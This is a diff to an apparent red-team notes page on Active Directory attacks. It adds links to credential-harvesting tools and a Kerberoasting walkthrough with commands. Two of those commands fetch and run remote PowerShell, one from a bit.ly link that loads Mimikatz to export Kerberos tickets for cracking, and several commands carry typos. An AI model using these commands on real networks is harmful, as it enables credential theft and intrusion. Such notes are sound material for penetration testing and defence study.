@@ -289,7 +289,17 @@ The Active Directory Mapping tool. Used by Red and Blue teamers to map out their
 {% endtab %}
 {% endtabs %}
 
-****
+## **AD Harvesting and Exploitation**
+
+{% tabs %}
+{% tab title="Tools" %}
+### **Credential Harvesting**
+
+* [Red Snarf](https://github.com/nccgroup/redsnarf) - RedSnarf is a pen-testing / red-teaming tool by Ed Williams for retrieving hashes and credentials from Windows workstations, servers and domain controllers using OpSec Safe Techniques
+  * [https://www.kali.org/tools/redsnarf/](https://www.kali.org/tools/redsnarf/)
+* [AD-006 - Dumping Domain Password Hashes](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
+
+### Exploitation
 
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of _large_ Active Directory networks. Built with stealth in mind, CME follows the concept of "Living off the Land": abusing built-in Active Directory features/protocols to achieve it's functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.
   * [Home · byt3bl33d3r/CrackMapExec Wiki · GitHub](https://github.com/byt3bl33d3r/CrackMapExec/wiki)&#x20;
@@ -298,10 +308,31 @@ The Active Directory Mapping tool. Used by Red and Blue teamers to map out their
 * [Powermad](https://github.com/Kevin-Robertson/Powermad) - PowerShell MachineAccountQuota and DNS exploit tools
   * [https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)
 * [https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/tools/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/tools/)
+{% endtab %}
 
-###
+{% tab title="Kerberoasting" %}
+Kerberoasting
 
-## ****
+* Any ticket can be requested by any user with kerberos, from the domain controller
+* Those tickets are encrypted with the NTLM hash of the associated service user.
+* If we can guess the password to teh associated service user's NTLM hash, then we now know the password to the actual service account
+* Steps:
+  * &#x20;List all SPN services. These are the service accounts for which we are going to pull all the kerberos tickets
+    * \>setspn -T \[domain] -F -Q \*/\*
+  * &#x20;Next we target either a single user SPN or pull all the user Kerberos tickets into our user's memory
+    * Single target
+      * \>powershell Add-Tpe -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArguementList “HTTP/\[hostname].\[domain].local”
+    * All User tickets
+      * \>powershell Add-Tpe -AssemblyName System.IdentityModel; IEX (New-Object Net.WebClient).DownloadString("https://githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1") | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArguementList $\_.ServicePrincipalName}catch{}
+    * &#x20;And the powersploit tool to automate this!
+      * [https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
+    * Now we have our tickets imported into memory and we need to extract them.
+      * Mimikatz Kerberoast export:
+      * \>powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2qx4kuH'); Invoke-Mimikatz -Command ‘’'''''kerberos::list /export'''''''
+      * Once extracted and on our victims machine and we can start cracking them!
+        * use tgsrepcrack.p
+{% endtab %}
+{% endtabs %}
 
 ## **AD Privilege Escalation**
 
